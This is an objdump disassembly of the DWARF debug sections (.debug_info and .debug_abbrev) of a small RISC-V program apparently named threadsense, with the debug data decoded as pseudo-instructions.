     ebc:	0910                	.2byte	0x910
     ebe:	00200003          	lb	zero,2(zero) # 2 <threadsense.5+0x2>
     ec2:	0080                	.2byte	0x80
     ec4:	0000                	.2byte	0x0
     ec6:	0c00                	.2byte	0xc00
     ec8:	0396                	.2byte	0x396
     eca:	0000                	.2byte	0x0
     ecc:	2401                	.2byte	0x2401
     ece:	330d                	.2byte	0x330d
     ed0:	0001                	.2byte	0x1
     ed2:	0d00                	.2byte	0xd00
     ed4:	0e00                	.2byte	0xe00
     ed6:	00000383          	lb	t2,0(zero) # 0 <threadsense.5>
     eda:	2d01                	.2byte	0x2d01
     edc:	8406                	.2byte	0x8406
     ede:	0085                	.2byte	0x85
     ee0:	0080                	.2byte	0x80
     ee2:	0000                	.2byte	0x0
     ee4:	6000                	.2byte	0x6000
     ee6:	0002                	.2byte	0x2
     ee8:	0000                	.2byte	0x0
     eea:	0000                	.2byte	0x0
     eec:	0100                	.2byte	0x100
     eee:	6c9c                	.2byte	0x6c9c
     ef0:	0001                	.2byte	0x1
     ef2:	0500                	.2byte	0x500
     ef4:	03c5                	.2byte	0x3c5
     ef6:	0000                	.2byte	0x0
     ef8:	a248                	.2byte	0xa248
     efa:	0000                	.2byte	0x0
     efc:	0200                	.2byte	0x200
     efe:	6891                	.2byte	0x6891
     f00:	8b05                	.2byte	0x8b05
     f02:	49000003          	lb	zero,1168(zero) # 490 <threadsense.2+0x40c>
     f06:	00a2                	.2byte	0xa2
     f08:	0000                	.2byte	0x0
     f0a:	9102                	.2byte	0x9102
     f0c:	0060                	.2byte	0x60
     f0e:	0003be0f          	.4byte	0x3be0f
     f12:	0100                	.2byte	0x100
     f14:	1128                	.2byte	0x1128
     f16:	0096                	.2byte	0x96
     f18:	0000                	.2byte	0x0
     f1a:	8538                	.2byte	0x8538
     f1c:	8000                	.2byte	0x8000
     f1e:	0000                	.2byte	0x0
     f20:	0000                	.2byte	0x0
     f22:	004c                	.2byte	0x4c
     f24:	0000                	.2byte	0x0
     f26:	0000                	.2byte	0x0
     f28:	0000                	.2byte	0x0
     f2a:	9c01                	.2byte	0x9c01
     f2c:	7810                	.2byte	0x7810
     f2e:	0100                	.2byte	0x100
     f30:	2128                	.2byte	0x2128
     f32:	0096                	.2byte	0x96
     f34:	0000                	.2byte	0x0
     f36:	9102                	.2byte	0x9102
     f38:	1158                	.2byte	0x1158
     f3a:	6962                	.2byte	0x6962
     f3c:	0074                	.2byte	0x74
     f3e:	2901                	.2byte	0x2901
     f40:	960e                	.2byte	0x960e
     f42:	0000                	.2byte	0x0
     f44:	0200                	.2byte	0x200
     f46:	6891                	.2byte	0x6891
     f48:	0000                	.2byte	0x0
     f4a:	055e                	.2byte	0x55e
     f4c:	0000                	.2byte	0x0
     f4e:	0005                	.2byte	0x5
     f50:	0801                	.2byte	0x801
     f52:	048c                	.2byte	0x48c
     f54:	0000                	.2byte	0x0
     f56:	7d10                	.2byte	0x7d10
     f58:	0000                	.2byte	0x0
     f5a:	0c00                	.2byte	0xc00
     f5c:	01a9                	.2byte	0x1a9
     f5e:	0000                	.2byte	0x0
     f60:	0000                	.2byte	0x0
     f62:	0000                	.2byte	0x0
     f64:	87e4                	.2byte	0x87e4
     f66:	8000                	.2byte	0x8000
     f68:	0000                	.2byte	0x0
     f6a:	0000                	.2byte	0x0
     f6c:	0718                	.2byte	0x718
     f6e:	0000                	.2byte	0x0
     f70:	0000                	.2byte	0x0
     f72:	0000                	.2byte	0x0
     f74:	1412                	.2byte	0x1412
     f76:	0000                	.2byte	0x0
     f78:	0102                	.2byte	0x102
     f7a:	7106                	.2byte	0x7106
     f7c:	0000                	.2byte	0x0
     f7e:	0800                	.2byte	0x800
     f80:	0050                	.2byte	0x50
     f82:	0000                	.2byte	0x0
     f84:	41182b03          	lw	s6,1041(a6)
     f88:	0000                	.2byte	0x0
     f8a:	0200                	.2byte	0x200
     f8c:	0801                	.2byte	0x801
     f8e:	0000006f          	j	f8e <threadsense.2+0xf0a>
     f92:	0202                	.2byte	0x202
     f94:	2e05                	.2byte	0x2e05
     f96:	0001                	.2byte	0x1
     f98:	0200                	.2byte	0x200
     f9a:	0702                	.2byte	0x702
     f9c:	0000011b          	sext.w	sp,zero
     fa0:	0411                	.2byte	0x411
     fa2:	6905                	.2byte	0x6905
     fa4:	746e                	.2byte	0x746e
     fa6:	0c00                	.2byte	0xc00
     fa8:	0056                	.2byte	0x56
     faa:	0000                	.2byte	0x0
     fac:	5d09                	.2byte	0x5d09
     fae:	0000                	.2byte	0x0
     fb0:	0900                	.2byte	0x900
     fb2:	0056                	.2byte	0x56
     fb4:	0000                	.2byte	0x0
     fb6:	0402                	.2byte	0x402
     fb8:	00028807          	.4byte	0x28807
     fbc:	0200                	.2byte	0x200
     fbe:	0508                	.2byte	0x508
     fc0:	020d                	.2byte	0x20d
     fc2:	0000                	.2byte	0x0
     fc4:	d408                	.2byte	0xd408
     fc6:	0002                	.2byte	0x2
     fc8:	0300                	.2byte	0x300
     fca:	1969                	.2byte	0x1969
     fcc:	0086                	.2byte	0x86
     fce:	0000                	.2byte	0x0
     fd0:	0802                	.2byte	0x802
     fd2:	00028307          	.4byte	0x28307
     fd6:	0200                	.2byte	0x200
     fd8:	0508                	.2byte	0x508
     fda:	0208                	.2byte	0x208
     fdc:	0000                	.2byte	0x0
     fde:	0102                	.2byte	0x102
     fe0:	7808                	.2byte	0x7808
     fe2:	0000                	.2byte	0x0
     fe4:	0900                	.2byte	0x900
     fe6:	0094                	.2byte	0x94
     fe8:	0000                	.2byte	0x0
     fea:	9b06                	.2byte	0x9b06
     fec:	0000                	.2byte	0x0
     fee:	0200                	.2byte	0x200
     ff0:	0708                	.2byte	0x708
     ff2:	027e                	.2byte	0x27e
     ff4:	0000                	.2byte	0x0
     ff6:	5208                	.2byte	0x5208
     ff8:	0000                	.2byte	0x0
     ffa:	0400                	.2byte	0x400
     ffc:	1318                	.2byte	0x1318
     ffe:	0035                	.2byte	0x35
    1000:	0000                	.2byte	0x0
    1002:	d608                	.2byte	0xd608
    1004:	0002                	.2byte	0x2
    1006:	0400                	.2byte	0x400
    1008:	143c                	.2byte	0x143c
    100a:	007a                	.2byte	0x7a
    100c:	0000                	.2byte	0x0
    100e:	0000ac0b          	.4byte	0xac0b
    1012:	cf00                	.2byte	0xcf00
    1014:	0000                	.2byte	0x0
    1016:	1200                	.2byte	0x1200
    1018:	1300                	.2byte	0x1300
    101a:	039d                	.2byte	0x39d
    101c:	0000                	.2byte	0x0
    101e:	0c02                	.2byte	0xc02
    1020:	c410                	.2byte	0xc410
    1022:	0000                	.2byte	0x0
    1024:	1400                	.2byte	0x1400
    1026:	03ec                	.2byte	0x3ec
    1028:	0000                	.2byte	0x0
    102a:	4302                	.2byte	0x4302
    102c:	5605                	.2byte	0x5605
    102e:	0000                	.2byte	0x0
    1030:	6400                	.2byte	0x6400
    1032:	008d                	.2byte	0x8d
    1034:	0080                	.2byte	0x80
    1036:	0000                	.2byte	0x0
    1038:	9800                	.2byte	0x9800
    103a:	0001                	.2byte	0x1
    103c:	0000                	.2byte	0x0
    103e:	0000                	.2byte	0x0
    1040:	0100                	.2byte	0x100
    1042:	169c                	.2byte	0x169c
    1044:	0002                	.2byte	0x2
    1046:	0100                	.2byte	0x100
    1048:	00636573          	csrrs	a0,0x6,6
    104c:	4402                	.2byte	0x4402
    104e:	b80e                	.2byte	0xb80e
    1050:	0000                	.2byte	0x0
    1052:	0200                	.2byte	0x200
    1054:	5891                	.2byte	0x5891
    1056:	00021603          	lh	a2,0(tp) # 0 <threadsense.5>
    105a:	0200                	.2byte	0x200
    105c:	0d45                	.2byte	0xd45
    105e:	0216                	.2byte	0x216
    1060:	0000                	.2byte	0x0
    1062:	7f989103          	lh	sp,2041(a7)
    1066:	0003f103          	.4byte	0x3f103
    106a:	0200                	.2byte	0x200
    106c:	0d46                	.2byte	0xd46
    106e:	0216                	.2byte	0x216
    1070:	0000                	.2byte	0x0
    1072:	7ef89103          	lh	sp,2031(a7)
    1076:	040d                	.2byte	0x40d
    1078:	0004                	.2byte	0x4
    107a:	0200                	.2byte	0x200
    107c:	0e48                	.2byte	0xe48
    107e:	00b8                	.2byte	0xb8
    1080:	0000                	.2byte	0x0
    1082:	6515                	.2byte	0x6515
    1084:	646e                	.2byte	0x646e
    1086:	0200                	.2byte	0x200
    1088:	1548                	.2byte	0x1548
    108a:	00b8                	.2byte	0xb8
    108c:	0000                	.2byte	0x0
    108e:	0003e603          	lwu	a2,0(t2)
    1092:	0200                	.2byte	0x200
    1094:	1a48                	.2byte	0x1a48
    1096:	00b8                	.2byte	0xb8
    1098:	0000                	.2byte	0x0
    109a:	7fb89103          	lh	sp,2043(a7)
    109e:	0003f703          	.4byte	0x3f703
    10a2:	0200                	.2byte	0x200
    10a4:	0e70                	.2byte	0xe70
    10a6:	0226                	.2byte	0x226
    10a8:	0000                	.2byte	0x0
    10aa:	9102                	.2byte	0x9102
    10ac:	0350                	.2byte	0x350
    10ae:	000003cf          	fnmadd.s	ft7,ft0,ft0,ft0,rne
    10b2:	7102                	.2byte	0x7102
    10b4:	260e                	.2byte	0x260e
    10b6:	0002                	.2byte	0x2
    10b8:	0200                	.2byte	0x200
    10ba:	4891                	.2byte	0x4891
    10bc:	00029503          	lh	a0,0(t0)
    10c0:	0200                	.2byte	0x200
    10c2:	0d72                	.2byte	0xd72
    10c4:	00ac                	.2byte	0xac
    10c6:	0000                	.2byte	0x0
    10c8:	9102                	.2byte	0x9102
    10ca:	8da40747          	.4byte	0x8da40747
    10ce:	8000                	.2byte	0x8000
    10d0:	0000                	.2byte	0x0
    10d2:	0000                	.2byte	0x0
    10d4:	0110                	.2byte	0x110
    10d6:	0000                	.2byte	0x0
    10d8:	0000                	.2byte	0x0
    10da:	0000                	.2byte	0x0
    10dc:	6901                	.2byte	0x6901
    10de:	7864                	.2byte	0x7864
    10e0:	0200                	.2byte	0x200
    10e2:	0e4c                	.2byte	0xe4c
    10e4:	0056                	.2byte	0x56
    10e6:	0000                	.2byte	0x0
    10e8:	9102                	.2byte	0x9102
    10ea:	076c                	.2byte	0x76c
    10ec:	8db0                	.2byte	0x8db0
    10ee:	8000                	.2byte	0x8000
    10f0:	0000                	.2byte	0x0
    10f2:	0000                	.2byte	0x0
    10f4:	00ec                	.2byte	0xec
    10f6:	0000                	.2byte	0x0
    10f8:	0000                	.2byte	0x0
    10fa:	0000                	.2byte	0x0
    10fc:	00040a03          	lb	s4,0(s0)
    1100:	0200                	.2byte	0x200
    1102:	124e                	.2byte	0x124e
    1104:	0000022b          	.4byte	0x22b
    1108:	7ef09103          	lh	sp,2031(ra)
    110c:	7301                	.2byte	0x7301
    110e:	6d75                	.2byte	0x6d75
    1110:	0200                	.2byte	0x200
    1112:	0d5d                	.2byte	0xd5d
    1114:	0056                	.2byte	0x56
    1116:	0000                	.2byte	0x0
    1118:	9102                	.2byte	0x9102
    111a:	1664                	.2byte	0x1664
    111c:	8db4                	.2byte	0x8db4
    111e:	8000                	.2byte	0x8000
    1120:	0000                	.2byte	0x0
    1122:	0000                	.2byte	0x0
    1124:	003c                	.2byte	0x3c
    1126:	0000                	.2byte	0x0
    1128:	0000                	.2byte	0x0
    112a:	0000                	.2byte	0x0
    112c:	01f4                	.2byte	0x1f4
    112e:	0000                	.2byte	0x0
    1130:	7401                	.2byte	0x7401
    1132:	0200                	.2byte	0x200
    1134:	0056124f          	fnmadd.s	ft4,fa2,ft5,ft0,rtz
    1138:	0000                	.2byte	0x0
    113a:	9102                	.2byte	0x9102
    113c:	0068                	.2byte	0x68
    113e:	008df407          	.4byte	0x8df407
    1142:	0080                	.2byte	0x80
    1144:	0000                	.2byte	0x0
    1146:	4800                	.2byte	0x4800
    1148:	0000                	.2byte	0x0
    114a:	0000                	.2byte	0x0
    114c:	0000                	.2byte	0x0
    114e:	0100                	.2byte	0x100
    1150:	0074                	.2byte	0x74
    1152:	5e02                	.2byte	0x5e02
    1154:	5612                	.2byte	0x5612
    1156:	0000                	.2byte	0x0
    1158:	0200                	.2byte	0x200
    115a:	6091                	.2byte	0x6091
    115c:	0000                	.2byte	0x0
    115e:	0000                	.2byte	0x0
    1160:	0000ac0b          	.4byte	0xac0b
    1164:	2600                	.2byte	0x2600
    1166:	0002                	.2byte	0x2
    1168:	0e00                	.2byte	0xe00
    116a:	0086                	.2byte	0x86
    116c:	0000                	.2byte	0x0
    116e:	001f ac06 0000      	.byte	0x1f, 0x00, 0x06, 0xac, 0x00, 0x00
    1174:	0b00                	.2byte	0xb00
    1176:	00b8                	.2byte	0xb8
    1178:	0000                	.2byte	0x0
    117a:	0000023b          	addw	tp,zero,zero
    117e:	860e                	.2byte	0x860e
    1180:	0000                	.2byte	0x0
    1182:	0000                	.2byte	0x0
    1184:	1700                	.2byte	0x1700
    1186:	03dc                	.2byte	0x3dc
    1188:	0000                	.2byte	0x0
    118a:	1202                	.2byte	0x1202
    118c:	7c06                	.2byte	0x7c06
    118e:	008c                	.2byte	0x8c
    1190:	0080                	.2byte	0x80
    1192:	0000                	.2byte	0x0
    1194:	e800                	.2byte	0xe800
    1196:	0000                	.2byte	0x0
    1198:	0000                	.2byte	0x0
    119a:	0000                	.2byte	0x0
    119c:	0100                	.2byte	0x100
    119e:	699c                	.2byte	0x699c
    11a0:	0002                	.2byte	0x2
    11a2:	0400                	.2byte	0x400
    11a4:	6469                	.2byte	0x6469
    11a6:	0078                	.2byte	0x78
    11a8:	1202                	.2byte	0x1202
    11aa:	b819                	.2byte	0xb819
    11ac:	0000                	.2byte	0x0
    11ae:	0200                	.2byte	0x200
    11b0:	6891                	.2byte	0x6891
    11b2:	0a00                	.2byte	0xa00
    11b4:	02e4                	.2byte	0x2e4
    11b6:	0000                	.2byte	0x0
    11b8:	1178                	.2byte	0x1178
    11ba:	00b8                	.2byte	0xb8
    11bc:	0000                	.2byte	0x0
    11be:	8c30                	.2byte	0x8c30
    11c0:	8000                	.2byte	0x8000
    11c2:	0000                	.2byte	0x0
    11c4:	0000                	.2byte	0x0
    11c6:	004c                	.2byte	0x4c
    11c8:	0000                	.2byte	0x0
    11ca:	0000                	.2byte	0x0
    11cc:	0000                	.2byte	0x0
    11ce:	9c01                	.2byte	0x9c01
    11d0:	000002a7          	.4byte	0x2a7
    11d4:	7804                	.2byte	0x7804
    11d6:	0100                	.2byte	0x100
    11d8:	2178                	.2byte	0x2178
    11da:	00b8                	.2byte	0xb8
    11dc:	0000                	.2byte	0x0
    11de:	9102                	.2byte	0x9102
    11e0:	0358                	.2byte	0x358
    11e2:	0216                	.2byte	0x216
    11e4:	0000                	.2byte	0x0
    11e6:	7a01                	.2byte	0x7a01
    11e8:	b80c                	.2byte	0xb80c
    11ea:	0000                	.2byte	0x0
    11ec:	0200                	.2byte	0x200
    11ee:	6891                	.2byte	0x6891
    11f0:	0a00                	.2byte	0xa00
    11f2:	0365                	.2byte	0x365
    11f4:	0000                	.2byte	0x0
    11f6:	1172                	.2byte	0x1172
    11f8:	00b8                	.2byte	0xb8
    11fa:	0000                	.2byte	0x0
    11fc:	8be4                	.2byte	0x8be4
    11fe:	8000                	.2byte	0x8000
    1200:	0000                	.2byte	0x0
    1202:	0000                	.2byte	0x0
    1204:	004c                	.2byte	0x4c
    1206:	0000                	.2byte	0x0
    1208:	0000                	.2byte	0x0
    120a:	0000                	.2byte	0x0
    120c:	9c01                	.2byte	0x9c01
    120e:	02e5                	.2byte	0x2e5
    1210:	0000                	.2byte	0x0
    1212:	7804                	.2byte	0x7804
    1214:	0100                	.2byte	0x100
    1216:	1f72                	.2byte	0x1f72
    1218:	00b8                	.2byte	0xb8
    121a:	0000                	.2byte	0x0
    121c:	9102                	.2byte	0x9102
    121e:	0158                	.2byte	0x158
    1220:	6962                	.2byte	0x6962
    1222:	0074                	.2byte	0x74
    1224:	7401                	.2byte	0x7401
    1226:	b80c                	.2byte	0xb80c
    1228:	0000                	.2byte	0x0
    122a:	0200                	.2byte	0x200
    122c:	6891                	.2byte	0x6891
    122e:	0f00                	.2byte	0xf00
    1230:	01ed                	.2byte	0x1ed
    1232:	0000                	.2byte	0x0
    1234:	275e                	.2byte	0x275e
    1236:	8b3c                	.2byte	0x8b3c
    1238:	8000                	.2byte	0x8000
    123a:	0000                	.2byte	0x0
    123c:	0000                	.2byte	0x0
    123e:	00a8                	.2byte	0xa8
    1240:	0000                	.2byte	0x0
    1242:	0000                	.2byte	0x0
    1244:	0000                	.2byte	0x0
    1246:	9c01                	.2byte	0x9c01
    1248:	0349                	.2byte	0x349
    124a:	0000                	.2byte	0x0
    124c:	0905                	.2byte	0x905
    124e:	5e000003          	lb	zero,1504(zero) # 5e0 <threadsense.2+0x55c>
    1252:	00005633          	srl	a2,zero,zero
    1256:	0200                	.2byte	0x200
    1258:	6c91                	.2byte	0x6c91
    125a:	00033e03          	ld	t3,0(t1)
    125e:	0100                	.2byte	0x100
    1260:	1760                	.2byte	0x1760
    1262:	005d                	.2byte	0x5d
    1264:	0000                	.2byte	0x0
    1266:	0309                	.2byte	0x309
    1268:	6004                	.2byte	0x6004
    126a:	8000                	.2byte	0x8000
    126c:	0000                	.2byte	0x0
    126e:	0000                	.2byte	0x0
    1270:	00031a03          	lh	s4,0(t1)
    1274:	0100                	.2byte	0x100
    1276:	1761                	.2byte	0x1761
    1278:	005d                	.2byte	0x5d
    127a:	0000                	.2byte	0x0
    127c:	0309                	.2byte	0x309
    127e:	6000                	.2byte	0x6000
    1280:	8000                	.2byte	0x8000
    1282:	0000                	.2byte	0x0
    1284:	0000                	.2byte	0x0
    1286:	380d                	.2byte	0x380d
    1288:	01000003          	lb	zero,16(zero) # 10 <threadsense.5+0x10>
    128c:	1762                	.2byte	0x1762
    128e:	0056                	.2byte	0x56
    1290:	0000                	.2byte	0x0
    1292:	0a00                	.2byte	0xa00
    1294:	0262                	.2byte	0x262
    1296:	0000                	.2byte	0x0
    1298:	0c4e                	.2byte	0xc4e
    129a:	0056                	.2byte	0x56
    129c:	0000                	.2byte	0x0
    129e:	89b4                	.2byte	0x89b4
    12a0:	8000                	.2byte	0x8000
    12a2:	0000                	.2byte	0x0
    12a4:	0000                	.2byte	0x0
    12a6:	0188                	.2byte	0x188
    12a8:	0000                	.2byte	0x0
    12aa:	0000                	.2byte	0x0
    12ac:	0000                	.2byte	0x0
    12ae:	9c01                	.2byte	0x9c01
    12b0:	040c                	.2byte	0x40c
    12b2:	0000                	.2byte	0x0
    12b4:	6e04                	.2byte	0x6e04
    12b6:	0100                	.2byte	0x100
    12b8:	1d4e                	.2byte	0x1d4e
    12ba:	0056                	.2byte	0x56
    12bc:	0000                	.2byte	0x0
    12be:	7fbc9103          	lh	sp,2043(s9)
    12c2:	9505                	.2byte	0x9505
    12c4:	0002                	.2byte	0x2
    12c6:	4e00                	.2byte	0x4e00
    12c8:	00040c37          	lui	s8,0x40
    12cc:	0300                	.2byte	0x300
    12ce:	b091                	.2byte	0xb091
    12d0:	057f 016a 0000 4b4e 	.byte	0x7f, 0x05, 0x6a, 0x01, 0x00, 0x00, 0x4e, 0x4b, 0x22, 0x04
    12d8:	0422 
    12da:	0000                	.2byte	0x0
    12dc:	7fa89103          	lh	sp,2042(a7)
    12e0:	6901                	.2byte	0x6901
    12e2:	0100                	.2byte	0x100
    12e4:	0750                	.2byte	0x750
    12e6:	0056                	.2byte	0x56
    12e8:	0000                	.2byte	0x0
    12ea:	9102                	.2byte	0x9102
    12ec:	076c                	.2byte	0x76c
    12ee:	89d8                	.2byte	0x89d8
    12f0:	8000                	.2byte	0x8000
    12f2:	0000                	.2byte	0x0
    12f4:	0000                	.2byte	0x0
    12f6:	00cc                	.2byte	0xcc
    12f8:	0000                	.2byte	0x0
    12fa:	0000                	.2byte	0x0
    12fc:	0000                	.2byte	0x0
    12fe:	7401                	.2byte	0x7401
    1300:	0030                	.2byte	0x30
    1302:	5401                	.2byte	0x5401
    1304:	110c                	.2byte	0x110c
    1306:	0004                	.2byte	0x4
    1308:	0200                	.2byte	0x200
    130a:	6091                	.2byte	0x6091
    130c:	7401                	.2byte	0x7401
    130e:	0031                	.2byte	0x31
    1310:	5401                	.2byte	0x5401
    1312:	111a                	.2byte	0x111a
    1314:	0004                	.2byte	0x4
    1316:	0200                	.2byte	0x200
    1318:	5891                	.2byte	0x5891
    131a:	7601                	.2byte	0x7601
    131c:	0030                	.2byte	0x30
    131e:	5501                	.2byte	0x5501
    1320:	110c                	.2byte	0x110c
    1322:	0004                	.2byte	0x4
    1324:	0200                	.2byte	0x200
    1326:	5091                	.2byte	0x5091
    1328:	7601                	.2byte	0x7601
    132a:	0031                	.2byte	0x31
    132c:	5501                	.2byte	0x5501
    132e:	111c                	.2byte	0x111c
    1330:	0004                	.2byte	0x4
    1332:	0200                	.2byte	0x200
    1334:	4891                	.2byte	0x4891
    1336:	6501                	.2byte	0x6501
    1338:	3171                	.2byte	0x3171
    133a:	0100                	.2byte	0x100
    133c:	0956                	.2byte	0x956
    133e:	0056                	.2byte	0x56
    1340:	0000                	.2byte	0x0
    1342:	9102                	.2byte	0x9102
    1344:	0144                	.2byte	0x144
    1346:	7165                	.2byte	0x7165
    1348:	0032                	.2byte	0x32
    134a:	5601                	.2byte	0x5601
    134c:	5619                	.2byte	0x5619
    134e:	0000                	.2byte	0x0
    1350:	0200                	.2byte	0x200
    1352:	4091                	.2byte	0x4091
    1354:	0000                	.2byte	0x0
    1356:	1d06                	.2byte	0x1d06
    1358:	0004                	.2byte	0x4
    135a:	0200                	.2byte	0x200
    135c:	0408                	.2byte	0x408
    135e:	00000357          	.4byte	0x357
    1362:	1109                	.2byte	0x1109
    1364:	0004                	.2byte	0x4
    1366:	0c00                	.2byte	0xc00
    1368:	0418                	.2byte	0x418
    136a:	0000                	.2byte	0x0
    136c:	1806                	.2byte	0x1806
    136e:	0004                	.2byte	0x4
    1370:	0a00                	.2byte	0xa00
    1372:	016a                	.2byte	0x16a
    1374:	0000                	.2byte	0x0
    1376:	0c3e                	.2byte	0xc3e
    1378:	0056                	.2byte	0x56
    137a:	0000                	.2byte	0x0
    137c:	883c                	.2byte	0x883c
    137e:	8000                	.2byte	0x8000
    1380:	0000                	.2byte	0x0
    1382:	0000                	.2byte	0x0
    1384:	0178                	.2byte	0x178
    1386:	0000                	.2byte	0x0
    1388:	0000                	.2byte	0x0
    138a:	0000                	.2byte	0x0
    138c:	9c01                	.2byte	0x9c01
    138e:	04ca                	.2byte	0x4ca
    1390:	0000                	.2byte	0x0
    1392:	6e04                	.2byte	0x6e04
    1394:	0100                	.2byte	0x100
    1396:	173e                	.2byte	0x173e
    1398:	0056                	.2byte	0x56
    139a:	0000                	.2byte	0x0
    139c:	9102                	.2byte	0x9102
    139e:	054c                	.2byte	0x54c
    13a0:	0295                	.2byte	0x295
    13a2:	0000                	.2byte	0x0
    13a4:	2e3e                	.2byte	0x2e3e
    13a6:	04ca                	.2byte	0x4ca
    13a8:	0000                	.2byte	0x0
    13aa:	9102                	.2byte	0x9102
    13ac:	0540                	.2byte	0x540
    13ae:	016a                	.2byte	0x16a
    13b0:	0000                	.2byte	0x0
    13b2:	3f3e                	.2byte	0x3f3e
    13b4:	000004cf          	fnmadd.s	fs1,ft0,ft0,ft0,rne
    13b8:	7fb89103          	lh	sp,2043(a7)
    13bc:	6901                	.2byte	0x6901
    13be:	0100                	.2byte	0x100
    13c0:	0740                	.2byte	0x740
    13c2:	0056                	.2byte	0x56
    13c4:	0000                	.2byte	0x0
    13c6:	9102                	.2byte	0x9102
    13c8:	076c                	.2byte	0x76c
    13ca:	8860                	.2byte	0x8860
    13cc:	8000                	.2byte	0x8000
    13ce:	0000                	.2byte	0x0
    13d0:	0000                	.2byte	0x0
    13d2:	00b8                	.2byte	0xb8
    13d4:	0000                	.2byte	0x0
    13d6:	0000                	.2byte	0x0
    13d8:	0000                	.2byte	0x0
    13da:	7401                	.2byte	0x7401
    13dc:	0030                	.2byte	0x30
    13de:	4401                	.2byte	0x4401
    13e0:	5609                	.2byte	0x5609
    13e2:	0000                	.2byte	0x0
    13e4:	0200                	.2byte	0x200
    13e6:	6891                	.2byte	0x6891
    13e8:	7401                	.2byte	0x7401
    13ea:	0031                	.2byte	0x31
    13ec:	4401                	.2byte	0x4401
    13ee:	00005617          	auipc	a2,0x5
    13f2:	0200                	.2byte	0x200
    13f4:	6491                	.2byte	0x6491
    13f6:	7601                	.2byte	0x7601
    13f8:	0030                	.2byte	0x30
    13fa:	4501                	.2byte	0x4501
    13fc:	5609                	.2byte	0x5609
    13fe:	0000                	.2byte	0x0
    1400:	0200                	.2byte	0x200
    1402:	6091                	.2byte	0x6091
    1404:	7601                	.2byte	0x7601
    1406:	0031                	.2byte	0x31
    1408:	4501                	.2byte	0x4501
    140a:	5619                	.2byte	0x5619
    140c:	0000                	.2byte	0x0
    140e:	0200                	.2byte	0x200
    1410:	5c91                	.2byte	0x5c91
    1412:	0000                	.2byte	0x0
    1414:	6206                	.2byte	0x6206
    1416:	0000                	.2byte	0x0
    1418:	0600                	.2byte	0x600
    141a:	00000067          	jr	zero # 0 <threadsense.5>
    141e:	0001c10f          	.4byte	0x1c10f
    1422:	3300                	.2byte	0x3300
    1424:	100d                	.2byte	0x100d
    1426:	0088                	.2byte	0x88
    1428:	0080                	.2byte	0x80
    142a:	0000                	.2byte	0x0
    142c:	2c00                	.2byte	0x2c00
    142e:	0000                	.2byte	0x0
    1430:	0000                	.2byte	0x0
    1432:	0000                	.2byte	0x0
    1434:	0100                	.2byte	0x100
    1436:	1c9c                	.2byte	0x1c9c
    1438:	0005                	.2byte	0x5
    143a:	0500                	.2byte	0x500
    143c:	024a                	.2byte	0x24a
    143e:	0000                	.2byte	0x0
    1440:	00a02933          	sgtz	s2,a0
    1444:	0000                	.2byte	0x0
    1446:	9102                	.2byte	0x9102
    1448:	0468                	.2byte	0x468
    144a:	006e                	.2byte	0x6e
    144c:	3301                	.2byte	0x3301
    144e:	5635                	.2byte	0x5635
    1450:	0000                	.2byte	0x0
    1452:	0200                	.2byte	0x200
    1454:	6491                	.2byte	0x6491
    1456:	6104                	.2byte	0x6104
    1458:	7272                	.2byte	0x7272
    145a:	0100                	.2byte	0x100
    145c:	04224533          	.4byte	0x4224533
    1460:	0000                	.2byte	0x0
    1462:	9102                	.2byte	0x9102
    1464:	0058                	.2byte	0x58
    1466:	e218                	.2byte	0xe218
    1468:	0001                	.2byte	0x1
    146a:	0100                	.2byte	0x100
    146c:	0d28                	.2byte	0xd28
    146e:	87e4                	.2byte	0x87e4
    1470:	8000                	.2byte	0x8000
    1472:	0000                	.2byte	0x0
    1474:	0000                	.2byte	0x0
    1476:	002c                	.2byte	0x2c
    1478:	0000                	.2byte	0x0
    147a:	0000                	.2byte	0x0
    147c:	0000                	.2byte	0x0
    147e:	9c01                	.2byte	0x9c01
    1480:	4a05                	.2byte	0x4a05
    1482:	0002                	.2byte	0x2
    1484:	2800                	.2byte	0x2800
    1486:	0000a023          	sw	zero,0(ra)
    148a:	0200                	.2byte	0x200
    148c:	6891                	.2byte	0x6891
    148e:	6e04                	.2byte	0x6e04
    1490:	0100                	.2byte	0x100
    1492:	2f28                	.2byte	0x2f28
    1494:	0056                	.2byte	0x56
    1496:	0000                	.2byte	0x0
    1498:	9102                	.2byte	0x9102
    149a:	0464                	.2byte	0x464
    149c:	7261                	.2byte	0x7261
    149e:	0072                	.2byte	0x72
    14a0:	2801                	.2byte	0x2801
    14a2:	cf3c                	.2byte	0xcf3c
    14a4:	0004                	.2byte	0x4
    14a6:	0200                	.2byte	0x200
    14a8:	5891                	.2byte	0x5891
	...

Disassembly of section .debug_abbrev:

0000000000000000 <.debug_abbrev>:
   0:	1101                	.2byte	0x1101
   2:	1000                	.2byte	0x1000
   4:	03175517          	auipc	a0,0x3175
   8:	1b0e                	.2byte	0x1b0e
   a:	250e                	.2byte	0x250e
   c:	130e                	.2byte	0x130e
   e:	0005                	.2byte	0x5
  10:	0000                	.2byte	0x0
  12:	2401                	.2byte	0x2401
  14:	0b00                	.2byte	0xb00
  16:	030b3e0b          	.4byte	0x30b3e0b
  1a:	000e                	.2byte	0xe
  1c:	0200                	.2byte	0x200
  1e:	0016                	.2byte	0x16
  20:	0b3a0e03          	lb	t3,179(s4) # 4d95 <threadsense.2+0x4d11>
  24:	0b390b3b          	.4byte	0xb390b3b
  28:	1349                	.2byte	0x1349
  2a:	0000                	.2byte	0x0
  2c:	03003403          	ld	s0,48(zero) # 30 <threadsense.5+0x30>
  30:	3a0e                	.2byte	0x3a0e
  32:	0121                	.2byte	0x121
  34:	21390b3b          	.4byte	0x21390b3b
  38:	0213490f          	.4byte	0x213490f
  3c:	0018                	.2byte	0x18
  3e:	0400                	.2byte	0x400
  40:	0111                	.2byte	0x111
  42:	0e25                	.2byte	0xe25
  44:	1f030b13          	add	s6,t1,496
  48:	01111f1b          	sllw	t5,sp,0x11
  4c:	0712                	.2byte	0x712
  4e:	1710                	.2byte	0x1710
  50:	0000                	.2byte	0x0
  52:	2405                	.2byte	0x2405
  54:	0b00                	.2byte	0xb00
  56:	030b3e0b          	.4byte	0x30b3e0b
  5a:	0008                	.2byte	0x8
  5c:	0600                	.2byte	0x600
  5e:	0101                	.2byte	0x101
  60:	1349                	.2byte	0x1349
  62:	1301                	.2byte	0x1301
  64:	0000                	.2byte	0x0
  66:	49002107          	flw	ft2,1168(zero) # 490 <threadsense.2+0x40c>
  6a:	00052f13          	slti	t5,a0,0
  6e:	0800                	.2byte	0x800
  70:	0034                	.2byte	0x34
  72:	0b3a0e03          	lb	t3,179(s4)
  76:	0b390b3b          	.4byte	0xb390b3b
  7a:	1349                	.2byte	0x1349
  7c:	193c193f 2e090000 	.8byte	0x2e090000193c193f
